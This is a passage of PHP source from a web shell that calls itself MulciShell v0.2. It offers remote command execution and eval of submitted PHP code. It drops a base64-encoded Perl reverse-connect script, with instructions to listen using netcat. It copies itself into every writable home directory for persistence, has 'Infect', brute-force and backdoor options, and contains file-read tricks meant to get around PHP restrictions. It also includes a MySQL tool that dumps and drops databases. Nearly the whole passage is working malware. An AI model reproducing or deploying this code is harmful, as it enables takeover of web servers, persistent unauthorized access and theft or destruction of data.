          @$fp=fopen($_POST['passwd'],'r') or die("Failed to open passwd file!");
 610.
          while(!feof($fp))
 611.
          {
 612.
              @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($fp));
 613.
              $path="/home/$user/public_html/";
 614.
              find_configs($path,$found);
 615.
          }
 616.
          @fclose($fp);
 617.
          echo "Scan complete. Found $found configs</br></br>";
 618.
      }
 619.
      if(isset($_POST['execmd']))
 620.
      {echo "<center><textarea rows='10' cols='100'>";
 621.
      echo execmd($_POST['cmd'],$disable);
 622.
      echo "</textarea></center>";}
 623.
      if(isset($_POST['execphp']))
 624.
      {echo "<center><textarea rows='10' cols='100'>";
 625.
      echo eval(stripslashes($_POST['phpcode']));
 626.
      echo "</textarea></center>";}
 627.
      if(isset($_POST['cnewfile']))
 628.
      {
 629.
          if(@fopen($_POST['newfile'],'w')) echo "File created<br>";
 630.
          else echo "Failed to create file<br>";
 631.
      }
 632.
      if(isset($_POST['cnewdir']))
 633.
      {
 634.
          if(@mkdir($_POST['newdir'])) echo "Directory created<br>";
 635.
          else echo "Failed to create directory<br>";
 636.
      }
 637.
      if(isset($_POST['doeditfile'])) FileEditor();
 638.
      switch($_GET['act'])
 639.
      {
 640.
          case 'backc':
 641.
          if(!isset($_POST['backconnip']))
 642.
          {
 643.
              echo "<center><form action='$self?act=backc' method='post'>
 644.
              Address: <input type='text' value='$_SERVER[REMOTE_ADDR]' name='backconnip'>
 645.
              Port: <input type='text' value='1337' name='backconnport'>
 646.
              <input type='submit' value='Connect'></br></br>
 647.
              Listen with netcat by executing 'nc -l -n -v -p 1337'</br></br>
 648.
              <b>Note: Be sure to foward your port first</b>
 649.
              </form></center>";
 650.
          } else {
 651.
              if(empty($_POST['backconnport'])||empty($_POST['backconnip'])) die("Specify a host/port");
 652.
              if(is_writable("."))
 653.
              {
 654.
                  @$fh=fopen(getcwd()."/bc.pl",'w');
 655.
                  @fwrite($fh,base64_decode($backconnect_perl));
 656.
                  @fclose($fh);
 657.
                  echo "Attempting to connect...</br>";
 658.
                  execmd("perl ".getcwd()."/bc.pl $_POST[backconnip] $_POST[backconnport]",$disable);
 659.
                  if(!@unlink(getcwd()."/bc.pl")) echo "<font color='#FF0000'>Warning: Failed to delete reverse-connection program</font></br>";
 660.
                  } else {
 661.
                      @$fh=fopen("/tmp/bc.pl","w");
 662.
                      @fwrite($fh,base64_decode($backconnect_perl));
 663.
                      @fclose($fh);
 664.
                      echo "Attempting to connect...</br>";
 665.
                      if(!@unlink("/tmp/bc.pl")) echo "<font color='#FF0000'><h2>Warning: Failed to delete reverse-connection program<</h2>/font></br>";
 666.
              }
 667.
          }
 668.
          break;
 669.
          case 'dbs': database_tools(); break;
 670.
          case 'sql': SQLLogin(); break;
 671.
          case 'sqledit': SQLEditor(); break;
 672.
          case 'download': SQLDownload(); break;
 673.
          case 'tools': show_tools(); break;
 674.
          case 'logout': $_SESSION=array(); session_destroy(); echo "Logged out from MySQL.<br>"; break;
 675.
          case 'f': FileEditor(); break;
 676.
          case 'encode':Encoder(); break;
 677.
          case 'bypass':security_bypass(); break;
 678.
          case 'bf':brute_force(); break;
 679.
          case 'bh': BackDoor(); break;
 680.
          case 'spread':
 681.
          if(!isset($_POST['spread_shell']))
 682.
          {
 683.
              echo "<center><form action='?act=spread' method='post'>
 684.
              This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaining.</br>
 685.
              Passwd file: <input type='text' value='/etc/passwd' name='passwd_file'></br>
 686.
              <input type='submit' value='Spread' name='spread_shell'>
 687.
              </form></center>";
 688.
          } else {
 689.
              $s=0;
 690.
              @$file=fopen($_POST['passwd_file'],'r');
 691.
              if(is_resource($file))
 692.
              {
 693.
                  while(!feof($file))
 694.
                  {
 695.
                      @list($user,$x,$uid,$gid,$blank,$home_dir)=explode(":",fgets($file));
 696.
                      spread_self($user,$s);
 697.
                  }
 698.
                  @fclose($file);
 699.
              }
 700.
              echo ($s>0)?"Spread complete. Successfully managed to spread the shell $s times</br>":"Failed to spread the shell.</br>";
 701.
          }
 702.
          break;
 703.
          case 'domains':
 704.
          $header="GET /search/reverse-ip-domain.php?q=$_SERVER[HTTP_HOST] HTTP/1.0\r\n";
 705.
          $header.="Host: searchy.protecus.de\r\n";
 706.
          $header.="Connection: Close\r\n\r\n";
 707.
          $domain_handle=fsockopen("searchy.protecus.de",80);
 708.
          @fputs($domain_handle,$header,strlen($header));
 709.
          while(@!feof($domain_handle))
 710.
          {
 711.
              echo fgets($domain_handle);
 712.
          }
 713.
          break;
 714.
          case 'kill':
 715.
          if(!isset($_POST['justkill']))
 716.
          {
 717.
              echo "<center>Do you *really* want to kill the shell?<br><br><form action='$self?act=kill' method='post'>
 718.
              <input type='submit' value='Yes' name='justkill'></center>";
 719.
          } else {
 720.
              if(@unlink(basename($_SERVER['PHP_SELF']))) echo "Shell deleted.<br>";
 721.
              else echo "Failed to delete shell<br>";
 722.
          }
 723.
          break;
 724.
          case 'sec':
 725.
          $mysql_on=function_exists("mysql_connect")?"ON":"OFF";
 726.
          $curl_on=function_exists("curl_init")?"ON":"OFF";
 727.
          $magic_quotes_on=get_magic_quotes_gpc()?"ON":"OFF";
 728.
          $register_globals_on=(@ini_get('register_globals')=='')?"OFF":"ON";
 729.
          $include_on=(@ini_get('allow_url_include')=='')?"Disabled":"Enabled";
 730.
          $etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";
 731.
          $ver=phpversion();
 732.
          echo "<center>Security overview</center><table style='margin: auto;'><tr><td>PHP Version</td><td>Safe mode</td><td>Open_Basedir</td><td>Magic_Quotes</td><td>Register globals</td><td>
 733.
          Remote includes</td><td>Read /etc/passwd?</td><td>MySQL</td><td>cURL</td></tr>
 734.
          <tr><td>$ver</td><td>$safe_mode</td><td>$open_basedir</td><td>$magic_quotes_on</td><td>$register_globals_on</td><td>$include_on</td>
 735.
          <td>$etc_passwd</td><td>$mysql_on</td><td>$curl_on</td>
 736.
          </tr>";
 737.
          "</table>";
 738.
          break;
 739.
          case 'enum':
 740.
          $windows=0;
 741.
          $path=CleanDir(getcwd());
 742.
          if(!eregi("Linux",php_uname())) {$windows=1;}
 743.
          if(!$windows)
 744.
          {
 745.
              $spath=str_replace("/home/","$serv/~",$path);
 746.
              $spath=str_replace("/public_html/","/",$spath);
 747.
              $URL="http://$spath/".basename($_SERVER['PHP_SELF']);
 748.
              echo "Enumerated shell link: <a href='$URL'>$URL</a>";
 749.
          } else echo "Enumeration failed<br>";
 750.
          break;
 751.
      }
 752.
      echo "<br>";
 753.
      if(isset($_POST['sqlquery']))
 754.
      {
 755.
          extract($_SESSION);
 756.
          $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
 757.
          if($conn)
 758.
          {
 759.
              if(isset($_POST['db'])) @mysql_select_db($_POST['db']);
 760.
              $post_query=@mysql_query(stripslashes($_POST['sqlquery'])) or die(mysql_error());
 761.
              $affected=@mysql_num_rows($post_query);
 762.
              echo "Affected rows: $affected<br>";
 763.
          }
 764.
      }
 765.
      $dirs=array();
 766.
      $files=array();
 767.
      if(!isset($_GET['d'])) {$d=CleanDir(realpath(getcwd())); $dh=@opendir(".") or die("Permission denied!");}
 768.
      else {$d=CleanDir($_GET['d']); $dh=@opendir($_GET['d']) or die("Permission denied!");}
 769.
      $current=explode("/",$d);
 770.
      echo "<table style='width: 100%; text-align: center;'><tr><td>Current location: ";for($p=0;$p<count($current);$p++)
 771.
      for($p=0;$p<count($current);$p++)
 772.
      {
 773.
              $cPath.=$current[$p].'/';
 774.
              echo "<a href=$self?d=$cPath>$current[$p]</a>/";
 775.
      }
 776.
      echo "</td></tr></table>";
 777.
      if(isset($_GET['d'])) echo "<form action='$self?d=$_GET[d]' method='post'>";
 778.
      else echo "<form action='$self?' method='post'>";
 779.
      echo "<table style='width: 100%'>
 780.
      <tr><td>File</td><td>Size</td><td>Owner/group</td><td>Perms</td><td>Writable</td><td>Modified</td><td>Action</td></tr>";
 781.
      while(($f=@readdir($dh)))
 782.
      {
 783.
          if(@is_dir($d.'/'.$f)) $dirs[]=$f;
 784.
          else $files[]=$f;
 785.
      }
 786.
      asort($dirs);
 787.
      asort($files);
 788.
      @closedir($dh);
 789.
          foreach($dirs as $f)
 790.
          {
 791.
              @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
 792.
              @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
 793.
              if(is_array($grp)) $grp=$grp['name'];
 794.
              if(is_array($own)) $own=$own['name'];
 795.
              $size="DIR";
 796.
              @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),2);
 797.
              @$write=is_writable($d.'/'.$f)?"Yes":"No";
 798.
              $mod=date("d/m/Y H:i:s",filemtime($d.'/'.$f));
 799.
              if($f==".") {continue;}
 800.
              elseif($f=="..")
 801.
              {
 802.
              $f=Trail($d.'/'.$f);
 803.
              echo "<tr><td><a href='$self?act=files&d=$f'>..</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td>None</td></tr>";
 804.
              continue;
 805.
              }
 806.
              echo "<tr><td><a href='$self?act=files&d=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
 807.
          }
 808.
          foreach($files as $f)
 809.
          {
 810.
              @$own=function_exists("posix_getpwuid")?posix_getpwuid(fileowner($d.'/'.$f)):fileowner($d.'/'.$f);
 811.
              @$grp=function_exists("posix_getgrgid")?posix_getgrgid(filegroup($d.'/'.$f)):filegroup($d.'/'.$f);
 812.
              if(is_array($grp)) $grp=$grp['name'];
 813.
              if(is_array($own)) $own=$own['name'];
 814.
              @$size=TrueSize(filesize($d.'/'.$f));
 815.
              @$ch=substr(base_convert(fileperms($d.'/'.$f),10,8),3);
 816.
              @$write=is_writable($d.'/'.$f)?"Yes":"No";
 817.
              @$mod=date("d/m/Y H:i:s",filemtime($d.'/'.$f));
 818.
              echo "<tr><td><a href='$self?act=f&file=$d/$f'>$f</a></td><td>$size</td><td>$own/$grp</td><td>$ch</td><td>$write</td><td>$mod</td><td><input type='checkbox' name='files[]' id='check' value='$d/$f'></td></tr>";
 819.
          }
 820.
          echo "</table>
 821.
          <input type='button' style='background-color: none; border: 1px solid white;' value='Toggle' onClick='togglecheck()'></br>
 822.
          With checked file(s):
 823.
          <select name='fileaction'>
 824.
          <option name='chmod'>Chmod</option>
 825.
          <option name='delete'>Delete</option>
 826.
          <option name='infect'>Infect</option><input type='text' value='chmod value' name='cmodv'>
 827.
          </select>
 828.
          <br><input type='submit' value='Go' name='massfiles'></form>";
 829.
      function SQLLogin()
 830.
      {
 831.
          global $self;
 832.
          if(!isset($_SESSION['log'])&&!isset($_POST['mconnect']))
 833.
          {
 834.
              echo "<center><form action='$self?act=sql' method='post'>
 835.
              Host: <input type='text' value='localhost' name='mhost'>
 836.
              Username: <input type='text' value='root' name='muser'>
 837.
              Password: <input type='password' value='' name='mpass'>
 838.
              Port: <input type='text' style='width: 40px' value='3306' name='mport'>
 839.
              <input type='submit' value='Connect' name='mconnect'>
 840.
              </form>
 841.
          </center>";
 842.
          }
 843.
          elseif(!isset($_SESSION['log'])&&isset($_POST['mconnect']))
 844.
          {
 845.
              extract($_POST);
 846.
              $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
 847.
              if($conn)
 848.
              {
 849.
                  $_SESSION['muser']=$muser;
 850.
                  $_SESSION['mhost']=$mhost;
 851.
                  $_SESSION['mpass']=$mpass;
 852.
                  $_SESSION['mport']=$mport;
 853.
                  $_SESSION['log']=true;
 854.
                  header("Location: $self?act=sqledit");
 855.
              }
 856.
                  else
 857.
                  echo "Failed to login with $muser@$mhost!<br>";
 858.
          } else {
 859.
              header("Location: $self?act=sqledit");
 860.
          }
 861.
      }
 862.
      function SQLEditor()
 863.
      {
 864.
          extract($_SESSION);
 865.
          $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
 866.
          if($conn)
 867.
          {
 868.
                  echo "Logged in as $muser@$mhost <a href='$self?act=logout'>[Logout]</a><center>";
 869.
                  echo "<form method='POST' action='$self?'>
 870.
                  Quick SQL query: <input type='text' style='width: 300px' value='select * from users' name='sqlquery'>
 871.
                  <input type='hidden' name='db' value='$_GET[db]'>
 872.
                  <input type='submit' value='Go' name='sql'>
 873.
                  </form>";
 874.
                  echo "<form action='$self?act=sqledit' method='post'>
 875.
                  <input type='submit' style='border: none;' value='[ List Processes ]' name='sql_list_proc'>
 876.
                  </form></center></br></br>";
 877.
                  if(isset($_POST['sql_list_proc']))
 878.
                  {
 879.
                      $res=mysql_list_processes();
 880.
                      echo "<table style='margin: auto; text-align: center;'><tr>
 881.
                      <td>Proc ID</td><td>Host</td><td>DB</td><td>Command</td><td>Time</td>
 882.
                      </tr>";
 883.
                      while($r=mysql_fetch_assoc($res)) echo "<tr><td>$r[Id]</td><td>$r[Host]</td><td>$r[db]</td><td>$r[Command]</td><td>$r[Time]</td></tr>";
 884.
                      mysql_free_result($res);
 885.
                      echo "</table></br>";
 886.
                  }
 887.
              if(!isset($_GET['db']))
 888.
              {
 889.
                  if(isset($_POST['dbc'])) db_create();
 890.
                  if(isset($_GET['dropdb'])) SQLDrop();
 891.
                  echo "<table style='margin: auto; text-align: center;'>
 892.
                  <tr><td>Database</td><td>Table count</td><td>Download</td><td>Drop</td></tr>";
 893.
                  $all_your_base=mysql_list_dbs($conn);
 894.
                  while($your_base=mysql_fetch_assoc($all_your_base))
 895.
                  {
 896.
                      $tbl=mysql_query("SHOW TABLES FROM $your_base[Database]");
 897.
                      $tbl_count=mysql_num_rows($tbl);
 898.
                      echo "<tr><td><a href='$self?act=sqledit&db=$your_base[Database]'>$your_base[Database]</td><td>$tbl_count</td><td><a href='$self?act=download&db=$your_base[Database]'>Download</a></td><td><a href='$self?act=sqledit&dropdb=$your_base[Database]'>Drop</a></td></tr>";
 899.
                  }
 900.
                  echo "</table></br><center><form action='$self?act=sqledit' method='post'>New database name: <input type='text' value='new_database' name='db_name'><input type='submit' style='border: none;' value='[ Create Database ]' name='dbc'></form></center></br>";
 901.
              }
 902.
              elseif(isset($_GET['db'])&&!isset($_GET['tbl']))
 903.
              {
 904.
                  if(isset($_POST['tblc'])) table_create();
 905.
                  if(isset($_GET['droptbl'])) SQLDrop();
 906.
                  echo "<table style='margin: auto; text-align: center;'>
 907.
                  <tr><td>Table</td><td>Column count</td><td>Dump</td><td>Drop</td></tr>";
 908.
                  $tables=mysql_query("SHOW TABLES FROM $_GET[db]");
 909.
                  while($tblc=mysql_fetch_array($tables))
 910.
                  {
 911.
                      $fCount=mysql_query("SHOW COLUMNS FROM $_GET[db].$tblc[0]");
 912.
                      $fc=mysql_num_rows($fCount);
 913.
                      echo "<tr><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$tblc[0]'>$tblc[0]</a></td><td>$fc</td><td><a href='$self?act=download&db=$_GET[db]&tbl=$tblc[0]'>Dump</td><td><a href='$self?act=sqledit&db=$_GET[db]&droptbl=$tblc[0]'>Drop</a></td></tr>";
 914.
                  }
 915.
                  echo "</table></br><center><form action='$self?act=sqledit&db=$_GET[db]' method='post'>Create new table: <input type='text' value='new_table' name='table_name'><input type='hidden' value='$_GET[db]' name='db_current'> <input type='submit' style='border: none;' value='[ Create Table ]' name='tblc'></form></center>";
 916.
              }
 917.
                  elseif(isset($_GET['field'])&&isset($_POST['sqlsave']))
 918.
                  {
 919.
                      $discard_values=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]='$_GET[v]'");
 920.
                      $values=mysql_fetch_assoc($discard_values);
 921.
                      $keys=array_keys($values);
 922.
                      $values=array();
 923.
                      foreach($_POST as $k=>$v)
 924.
                      if(in_array($k,$keys)) $values[]=$v;
 925.
                      $query="UPDATE $_GET[db].$_GET[tbl] SET ";
 926.
                      for($y=0;$y<count($values);$y++)
 927.
                      {
 928.
                          if($y==count($values)-1)
 929.
                          $query.="$keys[$y]='$values[$y]' ";
 930.
                          else
 931.
                          $query.="$keys[$y]='$values[$y]', ";
 932.
                      }
 933.
                      $query.="WHERE $_GET[field] = '$_GET[v]'";
 934.
                      $try=mysql_query($query) or die(mysql_error());
 935.
                      echo "<center>Table updated!<br>";
 936.
                      echo "<a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]'>Go back</a><br><br>";
 937.
                     
 938.
                  }
 939.
                  elseif(isset($_GET['field'])&&isset($_GET['v'])&&!isset($_GET['del']))
 940.
                  {
 941.
                      echo "<center><form action='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$_GET[field]&v=$_GET[v]' method='post'>";
 942.
                      $sql_fields=array();
 943.
                      $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
 944.
                      while($field=mysql_fetch_assoc($fields)) $sql_fields[]=$field['Field'];
 945.
                      $data=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]='$_GET[v]'");
 946.
                      $d_piece=mysql_fetch_assoc($data);
 947.
                      for($m=0;$m<count($sql_fields);$m++)
 948.
                      {
 949.
                          $point=$sql_fields[$m];
 950.
                          echo "$point: <input type='text' value='$d_piece[$point]' name='$sql_fields[$m]'></br>";
 951.
                      }
 952.
                      echo "<input type='submit' value='Save' name='sqlsave'></form></center>";
 953.
                  }
 954.
                  elseif(isset($_GET['db'])&&isset($_GET['tbl']))
 955.
                  {
 956.
                      if(isset($_GET['insert'])) SQLInsert();
 957.
                      if(isset($_GET['field'])&&isset($_GET['v'])&&isset($_GET['del']))
 958.
                      {
 959.
                          echo "<center>";
 960.
                          if(@mysql_query("DELETE FROM $_GET[db].$_GET[tbl] WHERE $_GET[field]=$_GET[v]")) echo "Row deleted</br>";
 961.
                          else echo "Failed to delete row</br>";
 962.
                          echo "</center>";
 963.
                      }
 964.
                      echo "<center><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&insert=1'>[Insert new row]</a></center>";
 965.
                      echo "<table style='margin: auto; text-align: center;'><tr>";
 966.
                      $cols=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
 967.
                      $fields=array();
 968.
                      while($col=mysql_fetch_assoc($cols))
 969.
                      {
 970.
                          array_push($fields,$col['Field']);
 971.
                          echo "<td>$col[Field]</td>";
 972.
                      }
 973.
                      echo "</tr>";
 974.
                      if(isset($_GET['s'])&&is_numeric($_GET['s']))
 975.
                      {$selector=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] LIMIT $_GET[s], 250");}
 976.
                      else
 977.
                      {$selector=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl] LIMIT 0, 250");}
 978.
                      while($select=mysql_fetch_row($selector))
 979.
                      {
 980.
                          echo "<tr>";
 981.
                          for($i=0;$i<count($fields);$i++)
 982.
                          {
 983.
                              echo "<td>".htmlspecialchars($select[$i])."</td>";    
 984.
                          }
 985.
                          echo "<td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$fields[0]&v=$select[0]'>Edit</a></td><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&field=$fields[0]&v=$select[0]&del=true'>Delete</a></td>";
 986.
                          echo "</tr>";
 987.
                      }
 988.
                      echo "</table>";
 989.
                      echo "<table style='margin: auto;'>";
 990.
                      if(isset($_GET['s']))
 991.
                      {
 992.
                          $prev=intval($_GET['s'])-250;
 993.
                          $next=intval($_GET['s'])+250;
 994.
                          if($_GET['s']>0)
 995.
                          echo "<tr><td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=$prev'>Previous</a></td>";
 996.
                          if(mysql_num_rows($selector)>249)
 997.
                          echo "<td><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=$next'>Next</a></td></tr>";
 998.
                      }
 999.
                      else echo "<center><a href='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&s=250'>Next</a></center>";
1000.
                      echo "</table>";
1001.
                  }
1002.
          else
1003.
          {
1004.
              $_SESSION=array();
1005.
              session_destroy();
1006.
              header("Location: $self?act=sql");
1007.
          }
1008.
       }
1009.
      }
1010.
      function SQLDownload()
1011.
      {
1012.
          extract($_SESSION);
1013.
          $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
1014.
          if($conn)
1015.
          {
1016.
              if(isset($_GET['db'])&&!isset($_GET['tbl']))
1017.
              {
1018.
                  $tables=array();
1019.
                  $dump_file="##################SQL Database dump####################\n";
1020.
                  $dump_file.="######################Dumped by: MulciShell v0.2#####################\n\n";
1021.
                  $get_tables=mysql_query("SHOW TABLES FROM $_GET[db]");
1022.
                  while($current_table=mysql_fetch_array($get_tables))
1023.
                  $tables[]=$current_table[0];
1024.
                  foreach($tables as $table_dump)
1025.
                  {
1026.
                      $data_selection=mysql_query("SELECT * FROM $_GET[db].$table_dump");
1027.
                      while($current_data=mysql_fetch_assoc($data_selection))
1028.
                      {
1029.
                          $fields=implode("`, `", array_keys($current_data));
1030.
                          $values=implode("`, `",array_values($current_data));
1031.
                          $dump_file.="INSERT INTO `$table_dump` ($fields) VALUES ($values); ";
1032.
                      }
1033.
                  }
1034.
              } elseif(isset($_GET['db'])&&isset($_GET['tbl']))
1035.
              {
1036.
                  $dump_file="##################SQL Database dump####################\n";
1037.
                  $dump_file.="######################Dumped by: MulciShell v0.2#####################\n";
1038.
                  $table_dump=mysql_query("SELECT * FROM $_GET[db].$_GET[tbl]");
1039.
                  while($table_data=mysql_fetch_assoc($table_dump))
1040.
                  {
1041.
                      $fields=implode("`, `",array_keys($table_data));
1042.
                      $values=implode("`, `",array_values($table_data));
1043.
                      $dump_file.="INSERT INTO `$_GET[db].$_GET[tbl]` ($fields) VALUES ($values`)\n";
1044.
                  }
1045.
              } else {
1046.
                  echo "Invalid!";
1047.
              }
1048.
          }
1049.
          $dump_file.="########################################################################################";
1050.
          if(!isset($_GET['tbl']))
1051.
          $file_name="$_GET[db]"."_DUMP.sql";
1052.
          else $file_name="$_GET[db]"."_$_GET[tbl]"."_DUMP.sql";
1053.
          ob_get_clean();
1054.
          header("Content-type: application/octet-stream");
1055.
          header("Content-length: ".strlen($dump_file));
1056.
            header("Content-disposition: attachment; filename=$file_name;");
1057.
            echo $dump_file;
1058.
          exit;
1059.
      }
1060.
      function SqlInsert()
1061.
      {
1062.
          extract($_SESSION);
1063.
          $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
1064.
          if($conn)
1065.
          {
1066.
              if(!isset($_POST['sql_insert']))
1067.
              {
1068.
                  echo "<form action='$self?act=sqledit&db=$_GET[db]&tbl=$_GET[tbl]&insert=1' method='post'><center>";    
1069.
                  $sql_fields=array();
1070.
                  $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
1071.
                  while($f=mysql_fetch_assoc($fields)) $sql_fields[]=$f['Field'];        
1072.
                  for($s=0;$s<count($sql_fields);$s++)
1073.
                  echo "$sql_fields[$s]:  <input type='text' name='$sql_fields[$s]'></br>";
1074.
                  echo "<input type='submit' value='Insert' name='sql_insert'></center></form>";
1075.
              } else {
1076.
                  $fields=mysql_query("SHOW COLUMNS FROM $_GET[db].$_GET[tbl]");
1077.
                  while($f=mysql_fetch_assoc($fields)) $sql_fields[]=$f['Field'];    
1078.
                  $values=array();
1079.
                  $keys=array();
1080.
                  $query="INSERT INTO $_GET[db].$_GET[tbl] (";
1081.
                  foreach($_POST as $k=>$v)
1082.
                  {
1083.
                      if(in_array($k,$sql_fields)&&!empty($v))
1084.
                      {
1085.
                          $values[]=$v;
1086.
                          $keys[]=$k;
1087.
                      }
1088.
                  }
1089.
                  for($k=0;$k<count($keys);$k++)
1090.
                  {
1091.
                      if($k==count($keys)-1) $query.="`$keys[$k]`";
1092.
                      else
1093.
                      $query.="`$keys[$k]`,";
1094.
                  }
1095.
                  $query.=") VALUES (";
1096.
                  for($v=0;$v<count($values);$v++)
1097.
                  {
1098.
                      if($v==count($values)-1) $query.="'$values[$v]'";
1099.
                      else
1100.
                      $query.="'$values[$v]',";
1101.
                  }
1102.
                  $query.=")";
1103.
                  echo "<center>";
1104.
                  if(@mysql_query($query)) echo "Row inserted</br>";
1105.
                  else echo "Failed to insert row</br>";
1106.
                  echo "</center>";
1107.
              }
1108.
          }
1109.
      }
1110.
      function SQLDrop()
1111.
      {
1112.
          echo "<center>";
1113.
          extract($_SESSION);
1114.
          $conn=@mysql_connect($mhost.":".$mport,$muser,$mpass);
1115.
          if($conn)
1116.
          {
1117.
              if(!isset($_GET['droptbl']))
1118.
              {
1119.
                  $query="DROP DATABASE $_GET[dropdb]";
1120.
                  if(@mysql_query($query)) echo "Database $_GET[dropdb] has been dropped<br>";
1121.
                  else echo "Failed to drop database $_GET[dropdb]<br>";
1122.
              } elseif(isset($_GET['db'])&&isset($_GET['droptbl']))
1123.
              {
1124.
                  $query="DELETE FROM $_GET[db].$_GET[droptbl]";
1125.
                  if(@mysql_query($query)) echo "Table $_GET[droptbl] has been dropped<br>";
1126.
                  else echo "Failed to drop table $_GET[droptbl]<br>";
1127.
              } else {
1128.
                  echo "Invalid request<br>";
1129.
              }
1130.
          } else echo "Failed to connect<br>";
1131.
          echo "</center>";
1132.
      }
1133.
      function db_create()
1134.
      {
1135.
          echo "<center>";
1136.
          if(isset($_POST['db_name']) && !empty($_POST['db_name']))
1137.
          {
1138.
              extract($_SESSION);
1139.
              @$conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
1140.
              if($conn)
1141.
              {
1142.
                  if(@mysql_query("CREATE DATABASE $_POST[db_name]")) echo "Status: Database $_POST[db_name] created!";
1143.
                  else echo "Failed to create database $_POST[db_name]</br>";
1144.
              } else echo "Failed to connect</br>";
1145.
          } else echo "Enter a DB name</br>";
1146.
          echo "</cenetr>";
1147.
      }
1148.
      function table_create()
1149.
      {
1150.
          echo "<center>";
1151.
          if(isset($_POST['table_name'])&&!empty($_POST['table_name']))
1152.
          {
1153.
              extract($_SESSION);
1154.
              @$conn=mysql_connect($mhost.":".$mport,$muser,$mpass);
1155.
              if($conn)
1156.
              {
1157.
                  @mysql_select_db($_POST['db_current']);
1158.
                  if(@mysql_query("CREATE TABLE `$_POST[table_name]` (`TEMPORARY` TEXT NOT NULL)")) echo "Status: Table $_POST[table_name] created!";
1159.
                  else echo "Failed to create table $_POST[table_name]";
1160.
              } else echo "Failed to connect!</br>";
1161.
          } else echo "Enter a table name</br>";
1162.
          echo "</center>";
1163.
      }
1164.
      function FileEditor()
1165.
      {
1166.
          if(isset($_GET['file']))
1167.
          $file=$_GET['file'];
1168.
          elseif(isset($_POST['nfile']))
1169.
          $file=$_POST['nfile'];
1170.
          elseif(isset($_POST['editfile']))
1171.
          $file=$_POST['editfile'];
1172.
          if(@!file_exists($file)) die("Permission denied!");
1173.
          if(isset($_POST['dfile']))
1174.
          {
1175.
              @$fh=fopen($file,'r');
1176.
              @$buffer=fread($fh,filesize($file));
1177.
              header("Content-type: application/octet-stream");
1178.
                 header("Content-length: ".strlen($buffer));
1179.
                header("Content-disposition: attachment; filename=".basename($file).';');
1180.
              @ob_get_clean();
1181.
                echo $buffer;
1182.
              @fclose($fh);
1183.
          }
1184.
          elseif(isset($_POST['delfile']))
1185.
          {
1186.
              if(!unlink(str_replace("//","/",$file))) echo "Failed to delete file!<br>";
1187.
              else echo "File deleted<br>";
1188.
          }
1189.
          elseif(isset($_POST['sfile']))
1190.
          {
1191.
              $fh=@fopen($file,'w') or die("Failed to open file for editing!");
1192.
              @fwrite($fh,stripslashes($_POST['file_contents']),strlen($_POST['file_contents']));
1193.
              echo "File saved!";
1194.
              @fclose($fh);
1195.
          }
1196.
          else
1197.
          {
1198.
              $fh=@fopen($file,'r');
1199.
              echo "<center>
1200.
              <form action='$self?act=f' method='post'>
1201.
              File to edit: <input type='text' style='width: 300px' value='$file' name='nfile'>
1202.
              <input type='submit' value='Go' name='gfile'></br></br>";
1203.
              echo "<textarea rows='20' cols='150' name='file_contents'>".htmlspecialchars(@fread($fh,filesize($file)))."</textarea></br></br>";
1204.
              echo "<input type='submit' value='Save file' name='sfile'>
1205.
              <input type='submit' value='Download file' name='dfile'>
1206.
              <input type='submit' value='Delete file' name='delfile'>
1207.
              </center></form>";
1208.
              @fclose($fh);
1209.
          }
1210.
      }
1211.
      function security_bypass()
1212.
      {
1213.
          if(isset($_POST['curl_bypass']))
1214.
          {
1215.
              $ch=curl_init("file://$_POST[file_bypass]");
1216.
              curl_setopt($ch,CURLOPT_HEADERS,0);
1217.
              curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
1218.
              $file_out=curl_exec($ch);
1219.
              curl_close($ch);
1220.
              echo "<textarea rows='20' cols='150' readonly>".htmlspecialchars($file_out)."</textarea></br></br>";
1221.
          }
1222.
          elseif(isset($_POST['tmp_bypass']))
1223.
          {
1224.
              tempnam("/home/",$_POST['file_passwd']);
1225.
          }
1226.
          elseif(isset($_POST['copy_bypass']))
1227.
          {
1228.
             
1229.
              if(@copy($_POST['file_bypass'],$_POST['dest']))
1230.
              {
1231.
                  echo "File successfully copied!</br>";
1232.
                  @$fh=fopen($_POST['dest'],'r');
1233.
                  echo "<textarea rows='20' cols='150' readonly>".htmlspecialchars(@fread($fh,filesize($_POST['dest'])))."</textarea></br></br>";
1234.
                  @fclose($fh);
1235.
              } else echo "Failed to copy file</br>";
1236.
          }
1237.
          elseif(isset($_POST['include_bypass']))
1238.
          {
1239.
              if(file_exists($_POST['file_bypass']))
1240.
              {
1241.
                  echo "<textarea rows='20' cols='150' readonly>";
